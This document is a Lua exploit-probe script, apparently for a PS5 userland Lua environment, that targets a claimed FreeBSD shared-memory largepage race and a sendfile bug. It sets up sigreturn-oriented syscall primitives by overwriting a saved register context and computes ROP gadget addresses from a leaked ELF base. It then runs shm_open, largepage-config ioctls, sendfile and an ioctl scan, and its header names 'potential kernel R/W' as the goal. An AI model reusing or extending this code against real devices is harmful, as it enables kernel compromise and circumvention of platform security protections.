-- CRASH_CLASS: MODERATE
-- PROBE 148a: CVE-2026-58094 POSIX shm largepage TOCTOU race
--
-- FIOSSHMLPGCNF ioctl sets page size for largepage shm objects.
-- The handler checks for existing config WITHOUT holding the lock.
-- Two threads racing can set conflicting page sizes → kernel state corruption.
-- Fixed in FreeBSD 14.4-p9 (Aug 2026). PS5 14.10 built Sep 28 → might be unfixed!
--
-- Test plan:
-- 1. Create shm object, try FIOSSHMLPGCNF ioctl
-- 2. If ioctl works, create two threads that race it
-- 3. Map the inconsistent object → potential kernel R/W

print("=== PROBE 148a: POSIXSHM LARGEPAGE ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function wq(addr, val) memory.write_qword(addr, val) end
local function wd(addr, val) memory.write_dword(addr, val) end

local pid = to_num(make_syscall(20)())
print("pid=" .. pid)

local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local sc_mmap = make_syscall(477)
local sc_thr = make_syscall(430)
local MC = 0x40
local srop_ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(srop_ctx)) end)
local brip = memory.read_qword(srop_ctx + MC + 0xA0)
local rh, rl = get_hi_lo(brip)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(srop_ctx)) end)
    wq(srop_ctx + MC + 0xA0, sc_addr)
    wq(srop_ctx + MC + 0x38, uint64(num))
    if a1 then wq(srop_ctx + MC + 0x08, a1) end
    if a2 then wq(srop_ctx + MC + 0x10, a2) end
    if a3 then wq(srop_ctx + MC + 0x18, a3) end
    if a4 then wq(srop_ctx + MC + 0x50, a4) end
    if a5 then wq(srop_ctx + MC + 0x28, a5) end
    if a6 then wq(srop_ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(srop_ctx)) end)
    if not ok then return nil end
    return rv
end

local info = memory.alloc(0x200)
wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0), uint64(info)) end)
local elo = to_num(memory.read_dword(info + 0x108))
local ehi = to_num(memory.read_dword(info + 0x10C))

local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x200000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
local gh, gl = get_hi_lo(gpu)

local g_ret     = uint64(string.format("0x%X%08X", ehi, elo + 0x42))
local g_pop_rdi = uint64(string.format("0x%X%08X", ehi, elo + 0xC9DFE))
local g_pop_rsi = uint64(string.format("0x%X%08X", ehi, elo + 0xD77D))
local g_pop_rax = uint64(string.format("0x%X%08X", ehi, elo + 0x992))
local g_wr      = uint64(string.format("0x%X%08X", ehi, elo + 0xD0B60))

-- [A] Create shm and test FIOSSHMLPGCNF ioctl
print("--- [A] SHM + IOCTL ---")

-- shm_open: O_CREAT|O_RDWR = 0x0202
local name = gpu + 0x1000
wd(name, 0x706C2F) -- "/lp"
wd(name + 4, 0x00003167) -- "g1\0\0"
local name_a = uint64(string.format("0x%X%08X", gh, gl + 0x1000))

local fd = srop(482, name_a, uint64(0x0202), uint64(0x1B6))
local fdv = fd and to_num(fd) or -999
print("shm_fd=" .. fdv)

if fdv >= 0 then
    -- FIOSSHMLPGCNF = _IOW('f', 129, struct shm_largepage_conf)
    -- = 0x80000000 | (8 << 16) | (0x66 << 8) | 0x81
    -- = 0x80086681
    -- struct shm_largepage_conf { int psind; int alloc_policy; }

    -- ioctl via make_syscall(54)
    -- ioctl(fd, cmd, arg)
    local conf = gpu + 0x2000

    -- Test psind=0 (base page), alloc_policy=1 (NOWAIT)
    wd(conf, 0) -- psind=0
    wd(conf + 4, 1) -- alloc_policy=NOWAIT
    local conf_a = uint64(string.format("0x%X%08X", gh, gl + 0x2000))

    -- ioctl = syscall 54
    -- ioctl(fd, FIOSSHMLPGCNF, conf_ptr)
    local r1 = srop(54, uint64(fdv), uint64("0x0000000080086681"), conf_a)
    print("ioctl_psind0=" .. (r1 and tostring(to_num(r1)) or "nil"))

    -- Test psind=1 (superpage, likely 2MB)
    wd(conf, 1)
    wd(conf + 4, 1)
    local r2 = srop(54, uint64(fdv), uint64("0x0000000080086681"), conf_a)
    print("ioctl_psind1=" .. (r2 and tostring(to_num(r2)) or "nil"))

    -- Test psind=2 (1GB page)
    wd(conf, 2)
    wd(conf + 4, 1)
    local r3 = srop(54, uint64(fdv), uint64("0x0000000080086681"), conf_a)
    print("ioctl_psind2=" .. (r3 and tostring(to_num(r3)) or "nil"))

    -- Also test FIOGSHMLPGCNF (GET config)
    -- _IOR('f', 130, struct shm_largepage_conf)
    -- = 0x40000000 | (8 << 16) | (0x66 << 8) | 0x82
    -- = 0x40086682
    wd(conf, 0)
    wd(conf + 4, 0)
    local r4 = srop(54, uint64(fdv), uint64("0x0000000040086682"), conf_a)
    print("ioctl_get=" .. (r4 and tostring(to_num(r4)) or "nil"))
    if r4 and to_num(r4) == 0 then
        print("  psind=" .. to_num(memory.read_dword(conf)))
        print("  policy=" .. to_num(memory.read_dword(conf + 4)))
    end

    -- Try shm_create_largepage approach
    -- On PS5 FreeBSD, there might be SHM_LARGEPAGE_ALLOC_DEFAULT=0, NOWAIT=1, HARD=2
    print("")
    print("--- [B] SHM_LARGEPAGE ---")

    -- FreeBSD 13+ has shm_open2 (syscall 571) which supports SHM_LARGEPAGE
    -- shm_open2(path, flags, mode, shmflags, name)
    -- SHM_LARGEPAGE = 1
    local name2 = gpu + 0x3000
    wd(name2, 0x706C2F)
    wd(name2 + 4, 0x00003267)
    local name2_a = uint64(string.format("0x%X%08X", gh, gl + 0x3000))

    -- shm_open2 doesn't have a standard syscall number in our range
    -- Try the standard shm_open with SHM_LARGEPAGE flag
    -- Actually, shm_open2 is part of the C library, not a direct syscall
    -- The kernel path is via shm_open + FIOSSHMLPGCNF ioctl

    -- Let's also try ioctl with different policies
    wd(conf, 1) -- psind=1 (2MB)
    wd(conf + 4, 0) -- alloc_policy=DEFAULT
    local r5 = srop(54, uint64(fdv), uint64("0x0000000080086681"), conf_a)
    print("ioctl_2mb_default=" .. (r5 and tostring(to_num(r5)) or "nil"))

    wd(conf, 1)
    wd(conf + 4, 2) -- HARD
    local r6 = srop(54, uint64(fdv), uint64("0x0000000080086681"), conf_a)
    print("ioctl_2mb_hard=" .. (r6 and tostring(to_num(r6)) or "nil"))

    -- Close and unlink
    srop(6, uint64(fdv))
    srop(483, name_a)
end

-- [C] Try SHM_ANON (anonymous shm)
print("")
print("--- [C] SHM_ANON ---")
-- SHM_ANON is typically (char*)1
-- But passing it as a path would need special handling
-- Instead, test with /dev/shm path prefix
local name3 = gpu + 0x4000
wd(name3, 0x6E612F) -- "/an"
wd(name3 + 4, 0x00006E6F) -- "on\0"
local name3_a = uint64(string.format("0x%X%08X", gh, gl + 0x4000))

local fd3 = srop(482, name3_a, uint64(0x0202), uint64(0x1B6))
print("shm_anon=" .. (fd3 and tostring(to_num(fd3)) or "nil"))

-- [D] sendfile on shm fd (CVE-2026-49427 angle)
print("")
print("--- [D] SENDFILE ---")

-- Create new shm for sendfile test
local name4 = gpu + 0x5000
wd(name4, 0x66732F) -- "/sf"
wd(name4 + 4, 0x00003174) -- "t1\0"
local name4_a = uint64(string.format("0x%X%08X", gh, gl + 0x5000))

local fd4 = srop(482, name4_a, uint64(0x0202), uint64(0x1B6))
local fd4v = fd4 and to_num(fd4) or -999
print("sf_fd=" .. fd4v)

if fd4v >= 0 then
    -- ftruncate to 1 page
    srop(480, uint64(fd4v), uint64(0x4000))

    -- Map and write data
    local sf_map = srop(477, uint64(0), uint64(0x4000), uint64(3), uint64(1), uint64(fd4v), uint64(0))
    local sfh, sfl = get_hi_lo(sf_map)
    if sfh ~= 0xFFFFFFFF then
        pcall(function() memory.write_dword(sf_map, 0xCAFEBABE) end)

        -- Create a socket pair for sendfile target
        -- socketpair(AF_UNIX=1, SOCK_STREAM=1, 0, sv)
        local sv = gpu + 0x6000
        wq(sv, uint64(0))
        local sv_a = uint64(string.format("0x%X%08X", gh, gl + 0x6000))

        -- socketpair = syscall 135
        local sp = srop(135, uint64(1), uint64(1), uint64(0), sv_a)
        print("socketpair=" .. (sp and tostring(to_num(sp)) or "nil"))

        if sp and to_num(sp) == 0 then
            local s0 = to_num(memory.read_dword(sv))
            local s1 = to_num(memory.read_dword(sv + 4))
            print("s0=" .. s0 .. " s1=" .. s1)

            -- sendfile(shm_fd, socket_fd, 0, nbytes, hdtr, sbytes, flags)
            -- syscall 393
            -- SF_NOCACHE = 0x10
            local sbytes = gpu + 0x7000
            wq(sbytes, uint64(0))
            local sbytes_a = uint64(string.format("0x%X%08X", gh, gl + 0x7000))

            local sf_r = srop(393, uint64(fd4v), uint64(s1), uint64(0),
                uint64(0x4000), uint64(0), sbytes_a)
            print("sendfile=" .. (sf_r and tostring(to_num(sf_r)) or "nil"))

            local sent = memory.read_qword(sbytes)
            local _, sentl = get_hi_lo(sent)
            print("sent=" .. sentl)

            -- sendfile with SF_NOCACHE
            wq(sbytes, uint64(0))
            local sf_r2 = srop(393, uint64(fd4v), uint64(s1), uint64(0),
                uint64(0x4000), uint64(0), sbytes_a)
            print("sendfile_nocache=" .. (sf_r2 and tostring(to_num(sf_r2)) or "nil"))

            -- Close sockets
            srop(6, uint64(s0))
            srop(6, uint64(s1))
        end

        srop(73, sf_map, uint64(0x4000))
    end

    srop(6, uint64(fd4v))
    srop(483, name4_a)
end

-- [E] Check remaining ioctl codes on shm fd
print("")
print("--- [E] SHM IOCTL SCAN ---")
local name5 = gpu + 0x8000
wd(name5, 0x63692F) -- "/ic"
wd(name5 + 4, 0x00003174) -- "t1\0"
local name5_a = uint64(string.format("0x%X%08X", gh, gl + 0x8000))

local fd5 = srop(482, name5_a, uint64(0x0202), uint64(0x1B6))
local fd5v = fd5 and to_num(fd5) or -999
if fd5v >= 0 then
    srop(480, uint64(fd5v), uint64(0x4000))

    local buf = gpu + 0x9000
    for off = 0, 63, 4 do wd(buf + off, 0) end
    local buf_a = uint64(string.format("0x%X%08X", gh, gl + 0x9000))

    -- Known file ioctls:
    -- FIONREAD = 0x4004667F
    -- FIOASYNC = 0x8004667D
    -- FIOCLEX = 0x20006601
    -- FIONCLEX = 0x20006602
    local ioctls = {
        {0x4004667F, "FIONREAD"},
        {0x8004667D, "FIOASYNC"},
        {0x20006601, "FIOCLEX"},
        {0x20006602, "FIONCLEX"},
        {0x40086682, "FIOGSHMLPGCNF"},
        {0x80086681, "FIOSSHMLPGCNF"},
    }

    for _, ic in ipairs(ioctls) do
        for off = 0, 15, 4 do wd(buf + off, 0) end
        local r = srop(54, uint64(fd5v), uint64(ic[1]), buf_a)
        local rv = r and to_num(r) or -999
        if rv ~= -1 and rv ~= 4294967295 and rv ~= -999 then
            print(ic[2] .. "=" .. rv .. " ***")
            -- Read output
            local v0 = to_num(memory.read_dword(buf))
            local v1 = to_num(memory.read_dword(buf + 4))
            if v0 ~= 0 or v1 ~= 0 then
                print("  out: 0x" .. string.format("%08X %08X", v0, v1))
            end
        else
            print(ic[2] .. "=-1")
        end
    end

    srop(6, uint64(fd5v))
    srop(483, name5_a)
end

print("")
print("pid_post=" .. tostring(to_num(make_syscall(20)())))
print("=== DONE ===")
